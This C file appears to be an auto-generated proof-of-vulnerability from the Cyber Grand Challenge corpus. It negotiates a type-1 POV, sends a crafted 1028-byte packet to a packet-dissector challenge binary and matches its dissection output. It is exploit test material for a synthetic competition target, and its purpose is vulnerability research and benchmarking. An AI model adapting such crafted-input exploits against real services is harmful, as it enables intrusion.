#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xcc\x78\xf2\x36"
         "\x3c\x72\xb9\x6d\x45\x21\x5d\x8a\xa1\x83\xf9\xf1\x16\x02\xdb\x99"
         "\xe8\x01\x00\x00\xe1\x1b\xf6\xc1\x03\x3b\xb5\x0f\x9d\x81\x06\x39"
         "\x50\x18\x6d\x23\x5e\xee\x46\xb8\x23\x55\x31\xed\x59\x5a\xfa\x08"
         "\xd3\x9d\xd8\xea\x78\xce\x7d\x20\xea\x5e\xb7\x2e\xdc\xe2\x61\x1c"
         "\xd4\xe5\x43\x1a\x7c\xe2\xdc\x87\x9d\xfa\xb4\xf8\x67\x09\xa8\x45"
         "\xb1\x5b\xce\x87\x41\x1e\x1e\xd4\x65\x2f\xec\xba\x4a\x4c\xd0\x62"
         "\x06\x3f\x62\xfc\xbb\x04\xa4\x39\x7b\x14\x5a\x8c\x4c\x4d\xf8\x72"
         "\x64\xbe\xa4\x4c\x27\x7f\x4e\xdb\x4e\xe9\x3d\xef\x22\xb8\xf9\xc2"
         "\x6b\x26\x4f\x40\xd7\x46\xbb\x75\xa4\xdb\x3b\x0c\xca\x61\x27\x85"
         "\x03\x56\xe6\xe4\x01\x54\x3b\x4d\x3a\x69\x8a\x49\x7c\x26\x56\x41"
         "\x0a\x00\x4a\x5c\xfc\x50\xf0\xd1\x9e\x31\xe2\x24\xac\xbc\x0a\xd0"
         "\x2c\x7b\xe5\x06\x77\xca\xad\x10\x65\x7c\x79\x98\x1a\x77\x7a\x2d"
         "\x63\x45\xba\xd8\x53\xe3\x58\x35\x94\xae\x81\x48\x16\x17\x28\xb0"
         "\xc9\xc1\xb1\xe0\x58\xa7\xcc\x16\x49\x42\x60\x68\xcb\xbe\xde\x4e"
         "\x93\xab\x0f\x5e\xdc\x42\x96\xc2\x1f\xf4\x2b\xd8\xfa\x18\xde\x43"
         "\xf7\x63\x4d\x1c\xa6\x08\xa2\xe9\x44\x23\x73\xc4\x05\x00\x96\x61"
         "\x14\xb9\x79\x2d\x93\xc2\x25\xf5\xdf\xc6\xc5\x05\xcf\x1d\x1d\x13"
         "\x5d\xc1\xcf\xec\x49\x8d\xfa\x9f\x0a\x55\x1f\x13\xc4\xa8\x59\x4a"
         "\xcb\x55\xe7\xee\x9b\x2a\x73\x56\x8b\xde\xb7\x10\x3e\x1c\xc1\xa3"
         "\x8e\xa3\x51\x8a\x00\x0f\x9a\x0d\x19\x82\xc5\x91\x3b\x15\x24\xf5"
         "\xac\xc0\xa8\x05\xc3\x0a\x3e\xfa\x59\xdd\xbc\x64\x9b\x29\xd9\xfc"
         "\xd5\x52\xf6\xb3\x17\x57\x45\xc7\xa6\x32\xeb\xd4\x13\x9f\x43\x42"
         "\xab\xa8\xc7\x5b\xa9\xe6\x72\xce\x9c\x0c\x06\xe0\x51\x9e\x66\xc0"
         "\xd9\x1a\xeb\xce\xa9\x64\xd3\x9b\xf1\x7e\xf5\x98\xda\x15\x8d\x79"
         "\x52\xf7\xd2\x35\xf6\x2b\x81\x29\x12\x72\x08\x71\x2f\x8e\x26\x8e"
         "\x81\xc7\xf9\xf3\x74\xec\xbc\x60\x79\xce\x6c\x07\x77\x65\xc9\x6d"
         "\xf1\xfa\x55\xe1\x28\x96\xc7\x19\x4c\x39\x32\xad\x62\xc2\xb0\x13"
         "\xe0\xc6\x5e\x05\xa4\x43\x36\xbd\x40\xe1\x5d\xf4\xb4\xf2\x91\x4e"
         "\x01\x61\xc0\xa4\xb7\x3d\x6d\xca\xb0\x08\x29\x1a\xd7\xb3\x12\x66"
         "\x5c\x45\x08\x94\x7b\xf3\x5f\x77\x5c\x82\xc0\xd7\xc5\xa0\x41\x72"
         "\x11\xa7\x97\xe8\xf6\x63\x03\x0b\xe4\x17\x2f\x96\x16\xaf\x4c\xd1"
         "\x34\x16\xf9\xeb\xb5\xc2\x36\xf5\xaf\x05\x22\xca\x67\x87\xd9\xf7"
         "\xb4\xcf\xe6\x67\xb8\x05\x00\x05\x00\x3d\xb4\x37\xf5\x05\x00\x35"
         "\x03\xce\x0a\x36\x8d\x92\xca\x0c\x77\x11\xb2\x2b\x15\xc1\x91\x2d"
         "\x54\xe9\x26\xf4\x7e\x0d\x84\xed\xdf\x27\x37\xc8\xf4\x66\xe4\xcf"
         "\x54\xfe\x3d\x28\xda\x83\x3f\xb3\x64\x83\x90\xaa\xed\xf8\x35\x95"
         "\x2b\x61\xb6\x6a\xb6\x49\xff\x78\x1f\x56\xa8\x1a\xce\xa9\xc3\x5d"
         "\xc8\x6a\x4a\x15\xe3\x93\xb4\xa6\xac\xe4\x9a\xd2\xb6\x5a\x1a\x7f"
         "\x9b\x15\xf7\xd4\x87\x26\xcc\x42\xef\x22\xf3\x53\xb4\xc4\x27\x40"
         "\x15\x2b\xf7\x1d\xb1\x26\x76\x11\xa9\xf1\x9b\xd7\x57\x93\x45\xb5"
         "\x2b\x66\x83\xe9\x2e\xca\x42\x8b\x62\xec\x1c\x52\xce\xb4\x00\x5e"
         "\x57\x93\x11\xf2\x52\x99\xb5\xd5\x4c\x0f\x2c\x77\x52\xab\x8e\x66"
         "\xef\x8a\x3d\xe9\x4e\xca\x66\x1f\xf8\xb4\xda\x01\x6d\x6b\xd7\x03"
         "\x1e\x9a\xfe\x18\xde\xd6\xb3\x28\x53\x47\xa4\x32\xe5\x13\x25\x1d"
         "\x27\x9a\x7e\xb4\xb6\x74\xe2\x27\x10\x7b\xce\xe8\x1c\x19\xe8\xc7"
         "\xf7\x19\xbd\x07\xaf\xb3\x39\x96\x7f\x9f\xf1\x59\x19\x7c\x7d\x33"
         "\xe5\x1b\xea\xdb\x57\x64\x6e\x81\xfc\x43\x92\x13\x56\x0f\x58\xdb"
         "\x5a\xf9\x5f\xbd\x3b\xfd\xce\x32\xa1\x65\xb5\x25\x1f\x33\xe7\x50"
         "\xb6\xcc\xc5\xab\xba\x3b\x4b\x44\xe7\x97\x3d\x38\x9d\x95\xed\x46"
         "\xf0\x5d\x68\xa5\x78\x69\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===heterophyllychlorochromates
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x68\x65\x74\x65\x72\x6f\x70\x68\x79\x6c\x6c"
         "\x79\x63\x68\x6c\x6f\x72\x6f\x63\x68\x72\x6f\x6d\x61\x74\x65\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
